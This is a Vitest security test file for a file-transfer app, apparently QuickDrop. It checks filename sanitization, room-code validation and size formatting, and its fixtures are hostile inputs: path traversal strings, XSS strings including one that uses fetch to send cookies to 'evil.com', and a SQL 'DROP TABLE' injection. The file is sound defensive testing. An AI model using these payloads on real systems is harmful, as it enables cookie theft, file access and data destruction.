/**
 * Security Tests for QuickDrop
 *
 * Tests that malicious inputs from the network cannot:
 * - Cause path traversal in filenames
 * - Inject XSS through filenames or metadata
 * - Cause integer overflow or NaN in size fields
 * - Bypass filename sanitization
 * - Create deceptive filenames that disguise file type
 */

import { describe, it, expect } from 'vitest';
import { sanitizeFilename } from '../../utils/validators';
import { generateRoomCode } from '../../services/crypto';
import { isValidRoomCode, normalizeRoomCode } from '../../utils/validators';
import { formatBytes } from '../../utils/formatters';

// ─── Filename Security ────────────────────────────────────────────────────

describe('Filename sanitization security', () => {
  const maliciousFilenames = [
    '../../../etc/passwd',
    '..\\..\\Windows\\System32\\config',
    '/etc/shadow',
    'C:\\Windows\\System32\\cmd.exe',
    '<script>alert(document.cookie)</script>.jpg',
    '<img src=x onerror="fetch(\'https://evil.com/\'+document.cookie)">.png',
    'file\x00hidden.jpg', // Null byte injection
    'a'.repeat(1000) + '.pdf', // Extremely long filename
    '\u202E\u202Epdf.exe', // Right-to-left override character trick
    'résumé.pdf', // Unicode accented characters (should be preserved)
    'file   name   .pdf', // Multiple spaces
    '   .hidden', // Leading spaces
    'CON', // Windows reserved name
    'PRN.pdf', // Windows reserved name with extension
    '\t\r\nfile.txt', // Whitespace control characters
  ];

  it('never returns a string containing path separators', () => {
    for (const name of maliciousFilenames) {
      const sanitized = sanitizeFilename(name);
      expect(sanitized).not.toContain('/');
      expect(sanitized).not.toContain('\\');
    }
  });

  it('never returns a string containing null bytes', () => {
    for (const name of maliciousFilenames) {
      const sanitized = sanitizeFilename(name);
      expect(sanitized).not.toContain('\x00');
    }
  });

  it('never returns an empty string (always falls back to "unnamed_file")', () => {
    const edgeCases = ['', '   ', '\x00', '\n\r\t', '///'];
    for (const name of edgeCases) {
      const sanitized = sanitizeFilename(name);
      expect(sanitized.length).toBeGreaterThan(0);
    }
  });

  it('removes HTML-dangerous characters', () => {
    const xss = '<script>alert(1)</script>';
    const sanitized = sanitizeFilename(xss + '.html');
    expect(sanitized).not.toContain('<');
    expect(sanitized).not.toContain('>');
  });

  it('preserves unicode filenames (internationalization)', () => {
    expect(sanitizeFilename('résumé.pdf')).toBe('résumé.pdf');
    expect(sanitizeFilename('हिंदी.pdf')).toBe('हिंदी.pdf');
    expect(sanitizeFilename('中文文件.pdf')).toBe('中文文件.pdf');
  });
});

// ─── Room Code Security ───────────────────────────────────────────────────

describe('Room code injection resistance', () => {
  const injectionAttempts = [
    '<script>alert(1)</script>',
    "'; DROP TABLE rooms; --",
    '{"type":"ROOM_FULL","roomId":"*"}',
    '../admin',
    'QK-' + 'A'.repeat(1000),
  ];

  it('rejects all injection attempts as invalid room codes', () => {
    for (const attempt of injectionAttempts) {
      expect(isValidRoomCode(attempt)).toBe(false);
    }
  });

  it('normalize function does not execute injected code', () => {
    for (const attempt of injectionAttempts) {
      // Should not throw; result may be invalid but must not execute code
      expect(() => normalizeRoomCode(attempt)).not.toThrow();
    }
  });
});

// ─── Metadata size field security ─────────────────────────────────────────

describe('File metadata size field handling', () => {
  it('formatBytes handles NaN size gracefully', () => {
    expect(formatBytes(NaN)).toBe('0 B');
  });

  it('formatBytes handles Infinity size gracefully', () => {
    expect(formatBytes(Infinity)).toBe('0 B');
  });

  it('formatBytes handles negative size gracefully', () => {
    expect(formatBytes(-1)).toBe('0 B');
    expect(formatBytes(-1024 * 1024)).toBe('0 B');
  });

  it('formatBytes handles MAX_SAFE_INTEGER without crashing', () => {
    const result = formatBytes(Number.MAX_SAFE_INTEGER);
    expect(typeof result).toBe('string');
    expect(result).not.toContain('NaN');
    expect(result).not.toContain('Infinity');
  });
});

// ─── Room code generation cannot be predicted ─────────────────────────────

describe('Room code entropy', () => {
  it('generates codes that are not trivially sequential', () => {
    const codes = Array.from({ length: 20 }, () => generateRoomCode());
    const suffixes = codes.map((c) => c.slice(3));

    // Check that not all codes are the same
    const uniqueSuffixes = new Set(suffixes);
    expect(uniqueSuffixes.size).toBeGreaterThan(15);
  });

  it('room code character set avoids lookalike characters', () => {
    const forbiddenChars = ['0', 'O', '1', 'I', 'l'];
    for (let i = 0; i < 200; i++) {
      const code = generateRoomCode();
      for (const forbidden of forbiddenChars) {
        // Check suffix only (not the fixed "QK-" prefix which has no forbidden chars)
        const suffix = code.slice(3);
        expect(suffix).not.toContain(forbidden);
      }
    }
  });
});
